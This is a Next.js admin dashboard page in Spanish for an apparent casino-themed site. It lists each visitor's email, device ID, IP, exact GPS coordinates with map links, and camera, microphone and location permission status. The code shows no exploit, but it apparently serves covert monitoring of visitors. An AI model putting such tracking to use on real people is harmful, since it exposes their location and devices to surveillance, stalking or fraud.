"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { api } from "@/lib/api";
import { dispositivo, enLinea, estadoCookie, estadoPermiso } from "@/lib/labels";
import { deviceIpCaption } from "@/lib/deviceIdentity";
import { mapsUrl } from "@/lib/maps";
import type { LabEvent, Visitor } from "@/lib/types";

type Stats = {
  usuarios: number;
  visitas: number;
  eventos: number;
  camara: number;
  microfono: number;
  ubicacion: number;
  cookies: number;
};

function Permiso({ ok, label }: { ok: string | boolean; label: string }) {
  const state = typeof ok === "boolean" ? (ok ? "granted" : "denied") : ok;
  const color =
    state === "granted" ? "text-emerald-300" : state === "denied" ? "text-red-300" : "text-[var(--muted)]";
  return (
    <span className={`rounded-full border border-white/10 px-2 py-0.5 ${color}`}>
      {label} {estadoPermiso(String(state))}
    </span>
  );
}

function VisitorCard({ row }: { row: Visitor }) {
  const ip = row.publicIpv4 || row.publicIp || row.lastIp;
  const hasGps = row.locationLat != null && row.locationLng != null;
  return (
    <div className="rounded-2xl border border-[var(--line)] bg-[var(--card)] p-4">
      <Link href={`/admin/visitors/${row.visitorId}`} className="block">
        <div className="flex items-start justify-between gap-2">
          <p className="min-w-0 break-all font-medium text-[var(--gold)]">{row.email}</p>
          <span className={`shrink-0 text-[11px] ${enLinea(row) ? "text-emerald-300" : "text-[var(--muted)]"}`}>
            {enLinea(row) ? "en línea" : "fuera"}
          </span>
        </div>
        <p className="mt-2 text-sm">
          {dispositivo(row.deviceType)}
          {row.browser ? ` · ${row.browser}` : ""}
        </p>
        {row.deviceId ? (
          <p className="mt-2 font-mono text-xs break-all text-[var(--gold-2)]">ID {row.deviceId}</p>
        ) : null}
        {row.deviceIp ? (
          <p className="mt-1 text-xs text-[var(--muted)]">
            {deviceIpCaption(row.deviceIpKind)} · {row.deviceIp}
          </p>
        ) : null}
        {ip ? <p className="mt-1 text-xs text-[var(--muted)]">Proveedor {ip}</p> : null}
        {hasGps ? (
          <p className="mt-1 font-mono text-xs text-emerald-300">
            {row.locationLat}, {row.locationLng}
          </p>
        ) : null}
        <div className="mt-3 flex flex-wrap gap-1.5 text-[11px]">
          <Permiso label="Cámara" ok={row.cameraStatus} />
          <Permiso label="Mic" ok={row.microphoneStatus} />
          <Permiso label="GPS" ok={row.locationStatus} />
          <Permiso label="Cookies" ok={estadoCookie(row.cookieConsent, row.cookieConsentAt)} />
        </div>
        <p className="mt-3 text-xs text-[var(--muted)]">
          {row.visitCount} visitas · {new Date(row.lastSeenAt).toLocaleString("es-MX")}
        </p>
      </Link>
      {hasGps ? (
        <a
          href={mapsUrl(row.locationLat as number, row.locationLng as number)}
          target="_blank"
          rel="noreferrer"
          className="mt-3 inline-flex rounded-xl bg-[var(--gold)] px-3 py-2 text-xs font-semibold text-black"
        >
          Ver en Google Maps
        </a>
      ) : null}
    </div>
  );
}

export default function AdminPage() {
  const router = useRouter();
  const [token, setToken] = useState("");
  const [stats, setStats] = useState<Stats | null>(null);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [events, setEvents] = useState<LabEvent[]>([]);
  const [q, setQ] = useState("");
  const [device, setDevice] = useState("");

  useEffect(() => {
    const saved = sessionStorage.getItem("zt_admin") || "";
    if (!saved) {
      router.replace("/admin/login");
      return;
    }
    setToken(saved);
  }, [router]);

  useEffect(() => {
    if (!token) return;
    const load = async () => {
      const [s, v, e] = await Promise.all([
        api.adminStats(token) as Promise<Stats>,
        api.adminVisitors(token, q, device) as Promise<{ visitors: Visitor[] }>,
        api.adminEvents(token) as Promise<{ events: LabEvent[] }>,
      ]);
      setStats(s);
      setVisitors(v.visitors);
      setEvents(e.events);
    };
    void load().catch(() => router.replace("/admin/login"));
    const timer = window.setInterval(() => void load().catch(() => undefined), 8000);
    return () => window.clearInterval(timer);
  }, [token, q, device, router]);

  const cards = [
    ["Usuarios", stats?.usuarios],
    ["Visitas", stats?.visitas],
    ["Cámara", stats?.camara],
    ["Micrófono", stats?.microfono],
    ["Ubicación", stats?.ubicacion],
    ["Cookies", stats?.cookies],
  ];

  return (
    <div className="space-y-6">
      <div className="flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
        <div>
          <p className="text-xs uppercase tracking-[0.2em] text-[var(--gold)]">Administrador</p>
          <h1 className="font-serif text-3xl sm:text-4xl md:text-5xl">Quién entró al casino</h1>
          <p className="mt-2 max-w-xl text-sm text-[var(--muted)]">
            Cuentas reales. Se actualiza solo: dispositivo, IP y permisos del navegador.
          </p>
        </div>
        <button
          type="button"
          onClick={() => {
            sessionStorage.removeItem("zt_admin");
            router.push("/admin/login");
          }}
          className="self-start text-sm text-[var(--muted)]"
        >
          Cerrar sesión
        </button>
      </div>

      <div className="grid grid-cols-2 gap-2 sm:gap-3 md:grid-cols-3 lg:grid-cols-6">
        {cards.map(([label, value]) => (
          <div key={String(label)} className="rounded-2xl border border-[var(--line)] bg-[var(--card)] p-3 sm:p-4">
            <p className="text-[11px] text-[var(--muted)] sm:text-xs">{label}</p>
            <p className="mt-1 font-serif text-2xl sm:text-3xl">{value ?? "—"}</p>
          </div>
        ))}
      </div>

      <div className="flex flex-col gap-2 sm:flex-row">
        <input
          value={q}
          onChange={(e) => setQ(e.target.value)}
          placeholder="Buscar correo o IP"
          className="w-full min-w-0 flex-1 rounded-xl border border-white/10 bg-black/40 px-3 py-2.5 text-sm"
        />
        <select
          value={device}
          onChange={(e) => setDevice(e.target.value)}
          className="w-full rounded-xl border border-white/10 bg-black/40 px-3 py-2.5 text-sm sm:w-auto"
        >
          <option value="">Todos</option>
          <option value="desktop">Computadora</option>
          <option value="mobile">Celular</option>
          <option value="tablet">Tablet</option>
        </select>
      </div>

      {visitors.length === 0 ? (
        <p className="rounded-2xl border border-[var(--line)] px-4 py-8 text-center text-sm text-[var(--muted)]">
          Aún no hay usuarios. Cuando alguien cree una cuenta, aparecerá aquí.
        </p>
      ) : (
        <div className="grid gap-3">
          {visitors.map((row) => (
            <VisitorCard key={row.visitorId} row={row} />
          ))}
        </div>
      )}

      <section>
        <h2 className="font-serif text-2xl sm:text-3xl">Actividad reciente</h2>
        <div className="mt-3 space-y-2">
          {events.length === 0 ? (
            <p className="text-sm text-[var(--muted)]">Cuando un usuario entre o acepte un permiso, se verá aquí.</p>
          ) : (
            events.slice(0, 12).map((event) => (
              <div key={event.id} className="rounded-2xl border border-white/10 px-4 py-3 text-sm">
                <p className="break-all text-[11px] text-[var(--gold)]">
                  {event.visitor?.email} · {new Date(event.createdAt).toLocaleString("es-MX")}
                </p>
                <p className="mt-1 text-[var(--muted)]">{event.message}</p>
              </div>
            ))
          )}
        </div>
      </section>
    </div>
  );
}
